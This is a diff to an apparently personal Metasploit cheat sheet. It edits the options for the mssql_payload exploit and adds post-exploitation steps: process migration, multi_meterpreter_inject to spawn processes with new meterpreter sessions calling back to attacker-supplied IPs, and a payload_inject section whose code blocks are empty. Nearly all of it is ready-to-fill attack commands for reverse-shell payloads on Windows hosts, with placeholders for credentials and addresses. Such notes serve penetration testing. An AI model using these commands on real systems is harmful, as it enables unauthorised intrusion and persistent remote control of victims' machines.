@@ -112,12 +112,48 @@ set domain <domain>
 set USE_WINDOWS_AUTHENT <true>
 set SRVHOST <handler_listen_ip>
 set SRVPORT <handler_listen_port>
-set LHOST <payload_connect_ip>
-set LPORT <payload_connect_port>
+set LHOST <payload_connect_to_ip>
+set LPORT <payload_connect_to_port>
 ```
 
 ## Run
 ```ruby
 use exploit/windows/mssql/mssql_payload
-run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_ip>,LPORT=<payload_connect_port> <ip>
+run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port> <ip>
+```
+
+# Spawn a new process and migrate to it
+```ruby
+use post/windows/manage/migrate
+set session <1>
+run
+```
+
+# Spawn new processes and initiate new meterpreter sessions
+## Options
+```ruby
+use post/windows/manage/multi_meterpreter_inject
+set AMOUNT <2>
+set HANDLER <true>
+set SESSION <1>
+set IPLIST <payload_connect_to_ips>
+set LPORT <payload_connect_to_port>
+```
+
+## Run
+```ruby
+use post/windows/manage/multi_meterpreter_inject
+run AMOUNT=<2>,HANDLER=<true>,SESSION=<1>,IPLIST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port> <ip>
+```
+
+# Spawn a new process and initiate a new meterpreter session
+## Options
+```ruby
+use exploit/windows/local/payload_inject
+
+```
+
+## Run
+```ruby
+
 ```
